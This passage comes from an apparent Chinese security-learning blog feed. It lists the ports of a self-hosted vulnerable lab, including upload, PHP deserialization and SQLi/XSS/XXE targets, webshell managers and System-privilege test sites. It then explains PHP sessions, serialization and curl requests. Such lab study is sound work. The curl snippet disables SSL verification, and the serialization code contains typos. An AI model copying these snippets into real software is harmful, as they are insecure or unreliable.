<li>源码靶场</li>
</ul>
<table>
<thead>
<tr>
<th align="center">端口</th>
<th align="center">靶场</th>
<th align="center">备注</th>
</tr>
</thead>
<tbody><tr>
<td align="center">8301</td>
<td align="center">Nginx文件解析漏洞</td>
<td align="center">需开启Nginx</td>
</tr>
<tr>
<td align="center">8302</td>
<td align="center">Apache文件解析漏洞</td>
<td align="center">需开启Apache</td>
</tr>
<tr>
<td align="center">8303</td>
<td align="center">IIS文件解析漏洞</td>
<td align="center">需开启IIS</td>
</tr>
<tr>
<td align="center">8304</td>
<td align="center">Upload靶场的链接与解析</td>
<td align="center">建议玩Upload-labs时边看此端口的内容</td>
</tr>
<tr>
<td align="center">8305</td>
<td align="center">表单无按钮提交</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8306</td>
<td align="center">修改上传目录</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8307</td>
<td align="center">双文件上传</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8308</td>
<td align="center">Fckeditor编辑器 v2.4.3</td>
<td align="center">基于Xycms</td>
</tr>
<tr>
<td align="center">8309</td>
<td align="center">Fckeditor编辑器 v2.5</td>
<td align="center">基于Xycms</td>
</tr>
<tr>
<td align="center">8310</td>
<td align="center">Fckeditor编辑器 v2.6.3</td>
<td align="center">基于Xycms</td>
</tr>
<tr>
<td align="center">8311</td>
<td align="center">EWEB编辑器 v5.5</td>
<td align="center">基于Xycms，有注入用代码eweb5.5.html</td>
</tr>
</tbody></table>
<ul>
<li>CMS/比赛靶场</li>
</ul>
<table>
<thead>
<tr>
<th align="center">端口</th>
<th align="center">靶场</th>
<th align="center">备注</th>
</tr>
</thead>
<tbody><tr>
<td align="center">8351</td>
<td align="center">dedecms v5.7 sp1</td>
<td align="center">上传目录修改</td>
</tr>
<tr>
<td align="center">8352</td>
<td align="center">南方数据</td>
<td align="center">双文件上传</td>
</tr>
<tr>
<td align="center">8353</td>
<td align="center">冠龙科技 v6.0</td>
<td align="center">目录遍历/上传</td>
</tr>
<tr>
<td align="center">8354</td>
<td align="center">W78企业建站系统</td>
<td align="center">利用exp构造上传</td>
</tr>
</tbody></table>
<h4 id="php相关"><a href="#php相关" class="headerlink" title="php相关"></a>php相关</h4><ul>
<li>源码靶场</li>
</ul>
<table>
<thead>
<tr>
<th align="center">端口</th>
<th align="center">靶场</th>
<th align="center">备注</th>
</tr>
</thead>
<tbody><tr>
<td align="center">8401</td>
<td align="center">php相关测试</td>
<td align="center">文件包含、PHP伪协议、代码执行、变量覆盖、目录遍历、URL重定向</td>
</tr>
<tr>
<td align="center">8402</td>
<td align="center">__wakeup()</td>
<td align="center">php反序列化wakeup函数的绕过</td>
</tr>
<tr>
<td align="center">8403</td>
<td align="center">php://input</td>
<td align="center">php伪协议</td>
</tr>
<tr>
<td align="center">8404</td>
<td align="center">php://filter</td>
<td align="center">php伪协议</td>
</tr>
</tbody></table>
<ul>
<li>CMS/比赛靶场</li>
</ul>
<table>
<thead>
<tr>
<th align="center">端口</th>
<th align="center">靶场</th>
<th align="center">备注</th>
</tr>
</thead>
<tbody><tr>
<td align="center">8451</td>
<td align="center">易库影视CMS</td>
<td align="center">文件包含</td>
</tr>
<tr>
<td align="center">8452</td>
<td align="center">海洋CMS v6.28</td>
<td align="center">代码执行</td>
</tr>
<tr>
<td align="center">8453</td>
<td align="center">dedecms v5.7</td>
<td align="center">变量覆盖</td>
</tr>
<tr>
<td align="center">8454</td>
<td align="center">20年网鼎杯青龙组Areserialize</td>
<td align="center">php反序列化</td>
</tr>
<tr>
<td align="center">8455</td>
<td align="center">buuoj极客大挑战2019PHP</td>
<td align="center">php反序列化</td>
</tr>
</tbody></table>
<h4 id="集成靶场以及Webshell"><a href="#集成靶场以及Webshell" class="headerlink" title="集成靶场以及Webshell"></a>集成靶场以及Webshell</h4><table>
<thead>
<tr>
<th align="center">端口</th>
<th align="center">靶场</th>
<th align="center">备注</th>
</tr>
</thead>
<tbody><tr>
<td align="center">9001</td>
<td align="center">mssql-labs</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">9002</td>
<td align="center">sqli-labs</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">9003</td>
<td align="center">xxe-lab</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">9004</td>
<td align="center">phpaudit-xxe</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">9005</td>
<td align="center">xss-labs</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">9006</td>
<td align="center">upload-labs</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">9051</td>
<td align="center">WEBSHELL箱子管理系统 V1.0</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">9052</td>
<td align="center">魔神WebShell</td>
<td align="center"></td>
</tr>
</tbody></table>
<h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><table>
<thead>
<tr>
<th align="center">端口</th>
<th align="center">靶场</th>
<th align="center">备注</th>
</tr>
</thead>
<tbody><tr>
<td align="center">88</td>
<td align="center">test</td>
<td align="center">Everyone的System权限</td>
</tr>
<tr>
<td align="center">89</td>
<td align="center">cgi-test</td>
<td align="center">Everyone的System权限、cgi测试</td>
</tr>
<tr>
<td align="center">80</td>
<td align="center">默认网站</td>
<td align="center">防冲突停止使用</td>
</tr>
</tbody></table>
<h3 id="待补充"><a href="#待补充" class="headerlink" title="待补充"></a>待补充</h3><h4 id="大靶场"><a href="#大靶场" class="headerlink" title="大靶场"></a>大靶场</h4><ul>
<li>XSS</li>
<li>CSRF</li>
<li>逻辑漏洞</li>
<li>Getshell靶场</li>
<li>JSP相关漏洞测试：Stuct2、Java反序列化漏洞、Tomcat部署漏洞、WebLogic攻击</li>
<li>▲ 各种靶场的更多CMS</li>
<li>▲ 可进行测试的CTF靶场</li>
</ul>
]]></content>
      <categories>
        <category>Web Security</category>
      </categories>
  </entry>
  <entry>
    <title>php session</title>
    <url>/2020/07/12/php_session/</url>
    <content><![CDATA[<hr>
<h2 id="php-session"><a href="#php-session" class="headerlink" title="php session"></a>php session</h2><ul>
<li>什么是php session<ul>
<li>session</li>
<li>php session</li>
<li>来自官方的解释</li>
</ul>
</li>
<li>php session的存储机制<ul>
<li>php处理器</li>
</ul>
</li>
<li>php session在php.ini中主要存在的配置项</li>
</ul>
<h3 id="0X00-什么是php-session"><a href="#0X00-什么是php-session" class="headerlink" title="0X00 什么是php session"></a>0X00 什么是php session</h3><h5 id="session"><a href="#session" class="headerlink" title="session"></a>session</h5><ul>
<li>session一般称为”会话控制”，简单来说就是是一种客户与网站/服务器更为安全的对话方式</li>
<li>一旦开启了session会话，便可以在网站的任何页面使用或保持这个会话，从而让访问者与网站之间建立了一种”对话”机制</li>
<li>不同语言的会话机制可能有所不同，这里仅讨论php session机制</li>
</ul>
<h5 id="php-session-1"><a href="#php-session-1" class="headerlink" title="php session"></a>php session</h5><ul>
<li>php session可以看做是一个特殊的变量，且该变量是用于存储关于用户会话的信息，或者更改用户会话的设置</li>
<li>需要注意的是，php session变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的，且其对应的具体session值会存储于服务器端，这也是与cookie的主要区别，所以seesion的安全性相对较高</li>
</ul>
<h5 id="来自官方的解释"><a href="#来自官方的解释" class="headerlink" title="来自官方的解释"></a>来自官方的解释</h5><ul>
<li><p>通过为每个独立用户分配唯一的会话ID，可以实现针对不同用户分别存储数据的功能。 会话通常被用来在多个页面请求之间保存及共享信息。一般来说，会话ID通过cookie的方式发送到浏览器，并且在服务器端也是通过会话ID来取回会话中的数据。如果请求中不包含会话ID信息，那么 PHP就会创建一个新的会话，并为新创建的会话分配新的ID</p>
</li>
<li><p>会话的工作流程很简单。当开始一个会话时，PHP会尝试从请求中查找会话ID（通常通过会话 cookie）， 如果请求中不包含会话ID信息，PHP就会创建一个新的会话（php_session_create_id）。会话开始之后，PHP就会将会话中的数据设置到<code>$_SESSION</code>变量中（在http response中通过set-cookie头部发送给客户端保存）。当PHP停止的时候，它会自动读取<code>$_SESSION</code>中的内容，并将其进行序列化， 然后发送给会话保存管理器来进行保存</p>
</li>
<li><p>默认情况下，PHP使用内置的文件会话保存管理器（files）来完成会话的保存。也可以通过配置项<code>session.save_handler</code>来修改所要采用的会话保存管理器。对于文件会话保存管理器，会将会话数据保存到配置项<code>session.save_path</code>所指定的位置 </p>
</li>
<li><p>可以通过调用函数<code>session_start()</code>来手动开始一个会话。 如果配置项<code>session.auto_start</code>设置为1， 那么请求开始的时候，会话会自动开始</p>
</li>
<li><p>PHP脚本执行完毕之后，会话会自动关闭。 同时，也可以通过调用函数<code>session_write_close()</code>来手动关闭会话</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">if (!isset($_SESSION[&apos;username&apos;])) &#123;</span><br><span class="line">  $_SESSION[&apos;username&apos;] = &apos;xianzhi&apos; ;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/php/cookie&session&token/process.png" alt="process"></p>
<h3 id="0X01-php-session的存储机制"><a href="#0X01-php-session的存储机制" class="headerlink" title="0X01 php session的存储机制"></a>0X01 php session的存储机制</h3><ul>
<li>php session的存储机制是由session.serialize_handler来定义引擎的，默认是以文件的方式存储，且存储的文件是由sess_sessionid来决定文件名的</li>
<li>session.serialize_handler定义的引擎有三种<ul>
<li>自PHP 5.5.4起可以使用php_serialize</li>
<li>上述三种处理器中，php_serialize在内部简单地直接使用serialize/unserialize函数，并且不会有php和php_binary所具有的限制。使用较旧的序列化处理器导致$_SESSION的索引既不能是数字也不能包含特殊字符(| 和 !)</li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th align="center">处理器名称</th>
<th align="center">存储格式</th>
</tr>
</thead>
<tbody><tr>
<td align="center">php</td>
<td align="center">键名</td>
</tr>
<tr>
<td align="center">php_binary</td>
<td align="center">键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值</td>
</tr>
<tr>
<td align="center">php_serialize</td>
<td align="center">经过serialize()函数序列化处理的数据</td>
</tr>
</tbody></table>
<h5 id="php处理器"><a href="#php处理器" class="headerlink" title="php处理器"></a>php处理器</h5><ul>
<li>session.serialize_handler等于php时候的序列化结果<ul>
<li>session为$_SESSION[‘session’]的键名，|后为传入GET参数经过序列化后的值</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    ini_set(&apos;session.serialize_handler&apos;,&apos;php&apos;);</span><br><span class="line">    session_start();</span><br><span class="line">    $_SESSION[&apos;username&apos;] = &apos;xianzhi&apos; ;  //username|s:7:&quot;xianzhi&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>session.serialize_handler等于php_binary时候的序列化结果<ul>
<li>#为键名长度对应的ASCII的值，sessionsessionsessionsessionsessions为键名，s:7:”xianzhi”;为传入GET参数经过序列化后的值</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    ini_set(&apos;session.serialize_handler&apos;,&apos;php_binary&apos;);</span><br><span class="line">    session_start();</span><br><span class="line">    $_SESSION[&apos;sessionsessionsessionsessionsessions&apos;] = &apos;xianzhi&apos; ;   //#sessionsessionsessionsessionsessions:7:&quot;xianzhi&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>session.serialize_handler等于php_serialize时候的序列化结果<ul>
<li>a:1表示$_SESSION数组中有1个元素，花括号里面内容即为传入GET参数经过序列化后的值</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    ini_set(&apos;session.serialize_handler&apos;,&apos;php_serialize&apos;);</span><br><span class="line">    session_start();</span><br><span class="line">    $_SESSION[&apos;username&apos;] = &apos;xianzhi&apos; ;  //a:1:&#123;s:8:&quot;username&quot;;s:7:&quot;xianzhi&quot;;&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="0X02-php-session在php-ini中主要存在的配置项"><a href="#0X02-php-session在php-ini中主要存在的配置项" class="headerlink" title="0X02 php session在php.ini中主要存在的配置项"></a>0X02 php session在php.ini中主要存在的配置项</h3><ul>
<li><p>session.gc_divisor：php session垃圾回收机制相关配置</p>
</li>
<li><p>session.sid_bits_per_character：指定编码的会话ID字符中的位数</p>
</li>
<li><p>session.save_path=””：该配置主要设置session的存储路径</p>
</li>
<li><p>session.save_handler=””：该配置主要设定用户自定义存储函数，如果想使用PHP内置session存储机制之外的可以使用这个函数</p>
</li>
<li><p>session.use_strict_mode：严格会话模式，严格会话模式不接受未初始化的会话ID并重新生成会话ID</p>
</li>
<li><p>session.use_cookies：指定是否在客户端用cookie来存放会话ID，默认启用</p>
</li>
<li><p>session.cookie_secure：指定是否仅通过安全连接发送cookie，默认关闭</p>
</li>
<li><p>session.use_only_cookies：指定是否在客户端仅仅使用cookie来存放会话ID，启用的话，可以防止有关通过URL传递会话ID的攻击</p>
</li>
<li><p>session.name：指定会话名以用做cookie的名字，只能由字母数字组成，默认为PHPSESSID</p>
</li>
<li><p>session.auto_start：指定会话模块是否在请求开始时启动一个会话，默认值为0，不启动</p>
</li>
<li><p>session.cookie_lifetime：指定了发送到浏览器的cookie的生命周期，单位为秒，值为0 表示”直到关闭浏览器”默认为0</p>
</li>
<li><p>session.cookie_path：指定要设置会话cookie 的路径，默认为 /</p>
</li>
<li><p>session.cookie_domain：指定要设置会话cookie 的域名，默认为无，表示根据 cookie 规范产生cookie的主机名</p>
</li>
<li><p>session.cookie_httponly：将Cookie标记为只能通过HTTP协议访问，即无法通过脚本语言（例如JavaScript）访问Cookie，此设置可以有效地帮助通过XSS攻击减少身份盗用</p>
</li>
<li><p>session.serialize_handler：定义用来序列化/反序列化的处理器名字，默认使用php，还有其他引擎，且不同引擎的对应的session的存储方式不相同，具体可见下文所述</p>
</li>
<li><p>session.gc_probability：该配置项与session.gc_divisor合起来用来管理garbagecollection，即垃圾回收进程启动的概率</p>
</li>
<li><p>session.gc_divisor：该配置项与session.gc_probability合起来定义了在每个会话初始化时启动垃圾回收进程的概率</p>
</li>
<li><p>session.gc_maxlifetime：指定过了多少秒之后数据就会被视为“垃圾”并被清除，垃圾搜集可能会在session启动的时候开始（取决于session.gc_probability和session.gc_divisor）</p>
</li>
<li><p>session.referer_check：包含有用来检查每个HTTPReferer的子串。如果客户端发送了Referer信息但是在其中并未找到该子串，则嵌入的会话 ID 会被标记为无效。默认为空字符串</p>
</li>
<li><p>session.cache_limiter：指定会话页面所使用的缓冲控制方法（none/nocache/private/private_no_expire/public）默认为nocache</p>
</li>
<li><p>session.cache_expire：以分钟数指定缓冲的会话页面的存活期，此设定对nocache缓冲控制方法无效。默认为 180</p>
</li>
<li><p>session.use_trans_sid：指定是否启用透明SID支持。默认禁用</p>
</li>
<li><p>session.sid_length：配置会话ID字符串的长度。会话ID的长度可以在22到256之间。默认值为32</p>
</li>
<li><p>session.trans_sid_tags：指定启用透明sid支持时重写哪些HTML标签以包括会话ID</p>
</li>
<li><p>session.trans_sid_hosts：指定启用透明sid支持时重写的主机，以包括会话ID</p>
</li>
<li><p>session.sid_bits_per_character：配置编码的会话ID字符中的位数</p>
</li>
<li><p>session.upload_progress.enabled：启用上传进度跟踪，并填充$_SESSION变量， 默认启用</p>
</li>
<li><p>session.upload_progress.cleanup：读取所有POST数据（即完成上传）后，立即清理进度信息，默认启用</p>
</li>
<li><p>session.upload_progress.prefix：配置<code>$ _SESSION</code>中用于上传进度键的前缀，默认为upload_progress_</p>
</li>
<li><p>session.upload_progress.name：<code>$ _SESSION</code>中用于存储进度信息的键的名称，默认为PHP_SESSION_UPLOAD_PROGRESS</p>
</li>
<li><p>session.upload_progress.freq：定义应该多长时间更新一次上传进度信息</p>
</li>
<li><p>session.upload_progress.min_freq：更新之间的最小延迟</p>
</li>
<li><p>session.lazy_write：配置会话数据在更改时是否被重写，默认启用</p>
</li>
</ul>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title>php序列化</title>
    <url>/2020/07/12/php_serialize_unserialize/</url>
    <content><![CDATA[<hr>
<h3 id="php序列化"><a href="#php序列化" class="headerlink" title="php序列化"></a>php序列化</h3><blockquote>
<p>   ▲ 对象的序列化利于对象的保存和传输，也可以让多个文件共享对象</p>
<p>   php序列化的函数为serialize，反序列化的函数为unserialize</p>
</blockquote>
<h5 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h5><ul>
<li>php序列化是为了在程序运行的过程中对对象进行转储而产生的。序列化可以将对象转换成字符串，但仅保留对象里的成员变量，不保留函数方法</li>
<li>例子<ul>
<li>O代表是对象，表示改对象名称有4个字符，”Test”表示改对象的名称，3表示改对象里有3个成员</li>
<li>变量的序列化<ul>
<li>public属性序列化后为本身</li>
<li>protected属性序列化后示方式是在变量名前加个%00*%00</li>
<li>private属性序列化后示方式是在变量名前加个%00类名%00</li>
</ul>
</li>
<li>括号里面的值根据分号来分开看，分号左边的是变量名，分号右边的是变量的值</li>
<li>▲ 序列化不保存方法</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    class Test&#123;</span><br><span class="line">        public $a = &apos;This is A&apos;;</span><br><span class="line">        protected $b = &apos;This is B&apos;;</span><br><span class="line">        private $c = &apos;This is C&apos;;</span><br><span class="line">        publice function test1()&#123;</span><br><span class="line">            return &apos;this is test1&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $test = new Test();</span><br><span class="line">    $sTest = serialize($test);</span><br><span class="line">    var_dump($sTest);  </span><br><span class="line">    // 输出为string(96) &quot;O:4:&quot;Test&quot;:3:&#123;s:1:&quot;a&quot;;s:9:&quot;This is A&quot;;s:4:&quot;*b&quot;;s:9:&quot;This is B&quot;;s:7:&quot;Testc&quot;;s:9:&quot;This is C&quot;;&#125;&quot;</span><br><span class="line"></span><br><span class="line">    解释</span><br><span class="line">    O 代表对象 因为我们序列化的是一个对象 序列化数组则用A来表示</span><br><span class="line">    4 代表类名字占三个字符 </span><br><span class="line">    Test 类名</span><br><span class="line">    3 代表三个属性</span><br><span class="line">    s 代表字符串</span><br><span class="line">    1 代表属性名长度</span><br><span class="line">    a 属性名</span><br><span class="line">    s:9:&quot;This is A&quot; 字符串 属性值长度 属性值</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>


<h5 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h5><ul>
<li>例子</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    class Test&#123;</span><br><span class="line">        public $a = &apos;This is A&apos;;</span><br><span class="line">        protected $b = &apos;This is B&apos;;</span><br><span class="line">        private $c = &apos;This is C&apos;;</span><br><span class="line">        publice function test1()&#123;</span><br><span class="line">            return &apos;this is test1&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $test = new Test();</span><br><span class="line">    $sTest = serialize($test);   </span><br><span class="line">    $uTest = unserialize($sTest);</span><br><span class="line">    var_dump($uTest);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //输出，还原成一个数组</span><br><span class="line">    object(Test)#2 (3) &#123;</span><br><span class="line">      [&quot;a&quot;]=&gt;</span><br><span class="line">      string(9) &quot;This is A&quot;</span><br><span class="line">      [&quot;b&quot;:protected]=&gt;</span><br><span class="line">      string(9) &quot;This is B&quot;</span><br><span class="line">      [&quot;c&quot;:&quot;Test&quot;:private]=&gt;</span><br><span class="line">      string(9) &quot;This is C&quot;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h5 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h5><ul>
<li>官网地址：<a href="https://www.php.net/manual/zh/language.oop5.magic.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/language.oop5.magic.php</a></li>
<li>__construct()当一个对象创建时被调用</li>
<li>__destruct()当一个对象销毁时被调用</li>
<li>__toString()当一个对象被当作一个字符串使用<ul>
<li>▲ __toString()则必须返回一个字符串</li>
</ul>
</li>
<li>__sleep()在对象被序列化之前运行<ul>
<li>▲ __sleep()期望能return一个数组</li>
</ul>
</li>
<li>__wakeup()在对象被反序列化之后被调用</li>
<li>__get()读取不可访问属性的值时被调用</li>
<li>__invoke()当尝试以调用函数的方式调用一个对象时被调用</li>
</ul>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title>php模拟get/post请求</title>
    <url>/2020/07/12/php_get_post_simulation/</url>
    <content><![CDATA[<hr>
<h2 id="php模拟get-post请求"><a href="#php模拟get-post请求" class="headerlink" title="php模拟get/post请求"></a>php模拟get/post请求</h2><ul>
<li>curl<ul>
<li>file_put_contents()函数</li>
<li>curl模拟GET请求</li>
<li>curl模拟POST请求</li>
</ul>
</li>
<li>file_get_contents<ul>
<li>stream_context_create()函数</li>
<li>http_build_query()函数</li>
<li>file_get_contents()函数</li>
<li>模拟GET请求</li>
<li>模拟POST请求</li>
</ul>
</li>
<li>fopen<ul>
<li>stream_get_meta_data()函数</li>
<li>模拟GET请求</li>
</ul>
</li>
<li>fsockopen<ul>
<li>fsockopen()函数</li>
<li>parse_url()函数</li>
<li>模拟GET请求</li>
<li>模拟POST请求</li>
</ul>
</li>
</ul>
<h3 id="0X00-curl"><a href="#0X00-curl" class="headerlink" title="0X00 curl"></a>0X00 curl</h3><ul>
<li>▲ 网上吹嘘curl库的强大，今天用来入门模拟一下GET和POST请求</li>
<li>官方手册：<a href="https://www.php.net/manual/zh/ref.curl.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/ref.curl.php</a></li>
<li>curl功能库简介：<a href="https://www.jb51.net/article/26751.htm" target="_blank" rel="noopener">https://www.jb51.net/article/26751.htm</a></li>
<li>curl基础流程<ul>
<li>curl_init()</li>
<li>curl_setopt()</li>
<li>curl_exec()</li>
<li>curl_close()</li>
</ul>
</li>
<li>▲ 支持多种代理模式（HTTP/FTP/SOCKS4/SOCKS5）</li>
</ul>
<h5 id="file-put-contents-函数"><a href="#file-put-contents-函数" class="headerlink" title="file_put_contents()函数"></a>file_put_contents()函数</h5><ul>
<li>要写入的数据。类型可以是 string，array 或者是 stream 资源</li>
<li>官方手册：<a href="https://www.php.net/manual/zh/function.file-put-contents.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.file-put-contents.php</a></li>
<li>▲ 可结合curl，将流数据，数组或者字符串写入文件</li>
</ul>
<h5 id="curl模拟GET请求"><a href="#curl模拟GET请求" class="headerlink" title="curl模拟GET请求"></a>curl模拟GET请求</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    header(&apos;Content-type:text/html;charset=utf-8&apos;);</span><br><span class="line">    $header = array();  //头部数组</span><br><span class="line">    $header[] = &apos;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&apos;;</span><br><span class="line">    $header[] = &apos;Cache-Control: no-cache&apos;;</span><br><span class="line">    $header[] = &apos;User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0&apos;;</span><br><span class="line">    $url = &apos;https://www.douban.com&apos;;  //要抓取的url</span><br><span class="line">    $ch = curl_init();  //curl初始化</span><br><span class="line">    $timeout = 15;  //超时时间</span><br><span class="line">    curl_setopt ($ch, CURLOPT_URL, $url);  //设置url</span><br><span class="line">    curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);  //设置显示还是写入字符串，1为显示</span><br><span class="line">    curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);  //设置超时时间</span><br><span class="line">    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);  //关闭SSL点对点验证</span><br><span class="line">    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);  //关闭SSL端对端验证</span><br><span class="line">    curl_setopt($ch, CURLOPT_HTTPHEADER, $header);  //设置请求头</span><br><span class="line">    curl_setopt($ch,　CURLOPT_PROXYTYPE,CURLPROXY_SOCKS5);  //设置代理方式</span><br><span class="line">    curl_setopt($ch, CURLOPT_PROXY, &quot;127.0.0.1:1080&quot;);  //设置代理的服务器</span><br><span class="line">    $file_contents = curl_exec($ch);  //发送curl请求</span><br><span class="line">    curl_close($ch);  //关闭curl请求</span><br><span class="line">    //$file_contents = json_decode($file_contents);  //若接收数据为json数据，解码</span><br><span class="line">    mb_convert_encoding($file_contents,&apos;utf-8&apos;);  //转换字符编码</span><br><span class="line">    $f = fopen(&quot;./1.html&quot;, &quot;a+&quot;);  //打开文件，模式为可写可读</span><br><span class="line">    Fwrite($f,$file_contents);  //写入文件</span><br><span class="line">    Fclose($f);  //关闭文件</span><br><span class="line">    print_r($file_contents);  //输出抓取的信息到屏幕上</span><br><span class="line">    </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h5 id="curl模拟POST请求"><a href="#curl模拟POST请求" class="headerlink" title="curl模拟POST请求"></a>curl模拟POST请求</h5><ul>
<li>test.php</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    var_dump($_POST);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    $post_data = array(</span><br><span class="line">        &apos;name&apos; =&gt; &apos;mzt&apos;,</span><br><span class="line">        &apos;age&apos; =&gt; &apos;21&apos; );  //post数据</span><br><span class="line">    $post_data = http_build_query($post_data);  //url-encode编码数据</span><br><span class="line">    $post_data = json_encode($post_data);  //json编码数据</span><br><span class="line">    $url = &apos;http://localhost/test.php&apos;;  //要抓取的url</span><br><span class="line">    $ch = curl_init();  //curl初始化</span><br><span class="line">    $timeout = 5;  //超时时间</span><br><span class="line">    curl_setopt ($ch, CURLOPT_URL, $url);  //设置url</span><br><span class="line">    curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);  //设置显示还是写入字符串，1为显示</span><br><span class="line">    curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);  //设置超时时间</span><br><span class="line">    curl_setopt($ch, CURLOPT_POST, 1);  //设置发送的方式为post</span><br><span class="line">    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);  //设置post的数据</span><br><span class="line">    //curl_setopt($ch, CURLOPT_HTTPHEADER, array(&apos;Content-Type:application/json&apos;));  //json编码设置</span><br><span class="line">    $file_contents = curl_exec($ch);  //发送curl请求</span><br><span class="line">    curl_close($ch);  //关闭curl请求</span><br><span class="line">    mb_convert_encoding($file_contents,&apos;utf-8&apos;);  //转换字符</span><br><span class="line">    print_r($file_contents);  //输出抓取的信息到屏幕</span><br><span class="line">    </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>


<h3 id="0X01-file-get-contents"><a href="#0X01-file-get-contents" class="headerlink" title="0X01 file_get_contents"></a>0X01 file_get_contents</h3><h5 id="stream-context-create-函数"><a href="#stream-context-create-函数" class="headerlink" title="stream_context_create()函数"></a>stream_context_create()函数</h5><ul>
<li>官方手册：<a href="https://www.php.net/manual/zh/function.stream-context-create.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.stream-context-create.php</a></li>
<li>创建并返回一个文本数据流并应用各种选项，可用于fopen(),file_get_contents()等过程的超时设置、代理服务器、请求方式、头信息设置的特殊过程</li>
</ul>
<h5 id="http-build-query-函数"><a href="#http-build-query-函数" class="headerlink" title="http_build_query()函数"></a>http_build_query()函数</h5><ul>
<li>官方手册：<a href="https://www.php.net/manual/zh/function.http-build-query" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.http-build-query</a></li>
<li>将数组转换 url-encoded 之后的请求字符串</li>
<li>▲ 博客介绍使用：<a href="https://www.cnblogs.com/zhja/archive/2012/11/10/2764174.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhja/archive/2012/11/10/2764174.html</a></li>
</ul>
<h5 id="file-get-contents-函数"><a href="#file-get-contents-函数" class="headerlink" title="file_get_contents()函数"></a>file_get_contents()函数</h5><ul>
<li>官方手册：<a href="https://www.php.net/manual/zh/function.file-get-contents" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.file-get-contents</a></li>
<li>将整个文件读入一个字符串</li>
<li>▲ 2020.03.15 只支持HTTP代理 </li>
<li>▲ 2020.03.15 对https的链接抓取会报错</li>
</ul>
<h5 id="模拟GET请求"><a href="#模拟GET请求" class="headerlink" title="模拟GET请求"></a>模拟GET请求</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    $url = &apos;http://www.wyu.cn/&apos;;  //要抓取的url</span><br><span class="line">    $html = file_get_contents($url);  //抓取url</span><br><span class="line">    print_r($html);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

